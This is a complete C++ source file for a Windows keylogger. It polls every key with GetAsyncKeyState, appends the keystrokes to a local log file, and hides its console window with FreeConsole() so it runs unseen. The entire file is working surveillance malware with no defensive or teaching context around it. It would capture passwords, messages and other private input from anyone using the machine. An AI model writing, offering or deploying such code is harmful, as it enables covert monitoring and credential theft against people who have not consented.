#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>

#define LOG_FILE "keystrokes.log"

// Function to log keystrokes
void log_keystroke(int key) 
{
    std::ofstream file(LOG_FILE, std::ios::app);
    if (!file) return;

    time_t now = time(0);
    
    // Handling special keys
    if (key == VK_BACK) file << "[BACKSPACE] ";
    else if (key == VK_RETURN) file << "[ENTER]\n";
    else if (key == VK_SPACE) file << " ";
    else if (key == VK_TAB) file << "[TAB] ";
    else if (key == VK_ESCAPE) {
        file << "[ESC] - Stopping logger.\n";
        exit(0);
    }
    // Handling normal characters
    else if ((key >= 32 && key <= 126)) file << char(key);

    file.close();
}

// Keylogger function
void keylogger() 
{
    while (true) 
    {
        for (int key = 8; key <= 190; key++) 
        {
            if (GetAsyncKeyState(key) & 0x0001) log_keystroke(key);
        }
        Sleep(10);
    }
}

int main() 
{
    FreeConsole();  // Hide console window
    keylogger();
    return 0;
}